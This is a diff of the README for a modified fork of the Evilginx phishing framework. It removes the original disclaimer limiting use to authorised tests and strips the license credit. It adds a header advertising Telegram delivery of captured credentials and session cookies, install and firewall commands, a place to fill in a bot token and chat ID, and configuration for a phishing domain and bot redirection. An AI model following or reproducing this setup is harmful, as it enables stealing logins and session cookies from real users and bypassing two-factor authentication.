@@ -5,60 +5,56 @@
   </p>
 </p>
 
-# Evilginx 3.0
+# Latest Evilginx 3.4.2 - Modified by @zn0m + telegram sending captured details + cookies
+
+![alt text](https://github.com/EvilHoster/EvilGinx2-3.4.1-Modification/blob/main/screenshot.jpg?raw=true)
+
+
+#THANKS !
+
 
 **Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
 
-This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
-Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
 
-<p align="center">
-  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
-</p>
+How to install ?
 
-## Disclaimer
+On Ubuntu:
+FRIST OF ALL MODIFY core/session.go
+const (
+	telegramBotToken = "" // Replace with your bot token from BotFather
+	telegramChatID = ""   // Replace with your chat ID with Get my Chat ID invite it to your groups
+)
 
-I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.
+1. sudo apt update sudo apt install git make gcc libpcap-dev -y wget https://go.dev/dl/go1.19.linux-amd64.tar.gz sudo tar -C /usr/local -xzf go1.19.linux-amd64.tar.gz export PATH=$PATH:/usr/local/go/bin source ~/.profile go version
+2. sudo ufw allow 53 sudo ufw allow 80 sudo ufw allow 443 sudo ufw reload sudo systemctl stop systemd-resolved sudo systemctl disable systemd-resolved
+3. sudo nano /etc/resolv.conf
+remove old ns add these:
+  nameserver 8.8.8.8
+  nameserver 8.8.4.4
+4. git clone https://github.com/zn0m/evgnx2.git
+5. cd evgnx2
+6.make
+7. sudo ./build/evilginx -p ./phishlets -t ./redirectors 127.0.0.1:35800 -developer
 
-## Evilginx Mastery Training Course
+Setup your configuration.
 
-If you want everything about reverse proxy phishing with **Evilginx** - check out my [Evilginx Mastery](https://academy.breakdev.org/evilginx-mastery) course!
+1. config domain something.com
+2. cofig ipv4 external serverip
+3. config ipv4 bind serverip
+4. config unauth_url https://bots.here.redirected.com/
+5. config autocert off/on
 
-<p align="center">
-  <a href="https://academy.breakdev.org/evilginx-mastery"><img alt="Evilginx Mastery" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx_mastery.jpg" height="320" /></a>
-</p>
+[ if ON free certificates is used, it can rate-limit your domain if u ask too much. ]
+[ If OFF 
+- Feature: Added support to load custom TLS certificates from a public certificate file and a private key file stored in `~/.evilginx/crt/sites/<hostname>/`. Will load `fullchain.pem` and `privkey.pem` pair or a combination of a `.pem`/`.crt` (public certificate) and a `.key` (private key) file. Make sure to run without `-developer` flag and disable autocert retrieval with `config autocert off`.
+}
 
-Learn everything about the latest methods of phishing, using reverse proxying to bypass Multi-Factor Authentication. Learn to think like an attacker, during your red team engagements, and become the master of phishing with Evilginx.
 
-Grab it here:
-https://academy.breakdev.org/evilginx-mastery
 
-## Official Gophish integration
 
-If you'd like to use Gophish to send out phishing links compatible with Evilginx, please use the official Gophish integration with Evilginx 3.3.
-You can find the custom version here in the forked repository: [Gophish with Evilginx integration](https://github.com/kgretzky/gophish/)
+Add to your Telegram group https://t.me/raw_data_bot and your Group Chat ID will be displayed.
 
-If you want to learn more about how to set it up, please follow the instructions in [this blog post](https://breakdev.org/evilginx-3-3-go-phish/)
 
-## Write-ups
-
-If you want to learn more about reverse proxy phishing, I've published extensive blog posts about **Evilginx** here:
-
-[Evilginx 2.0 - Release](https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens)
-
-[Evilginx 2.1 - First Update](https://breakdev.org/evilginx-2-1-the-first-post-release-update/)
-
-[Evilginx 2.2 - Jolly Winter Update](https://breakdev.org/evilginx-2-2-jolly-winter-update/)
-
-[Evilginx 2.3 - Phisherman's Dream](https://breakdev.org/evilginx-2-3-phishermans-dream/)
-
-[Evilginx 2.4 - Gone Phishing](https://breakdev.org/evilginx-2-4-gone-phishing/)
-
-[Evilginx 3.0](https://breakdev.org/evilginx-3-0-evilginx-mastery/)
-
-[Evilginx 3.2](https://breakdev.org/evilginx-3-2/)
-
-[Evilginx 3.3](https://breakdev.org/evilginx-3-3-go-phish/)
 
 ## Help
 
@@ -66,10 +62,6 @@ In case you want to learn how to install and use **Evilginx**, please refer to o
 
 https://help.evilginx.com
 
-## Support
 
-I DO NOT offer support for providing or creating phishlets. I will also NOT help you with creation of your own phishlets. Please look for ready-to-use phishlets, provided by other people.
-
-## License
-
-**evilginx2** is made by Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky)) and it's released under BSD-3 license.
+This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, but i did modification in 2024.04.02 which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
+Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.
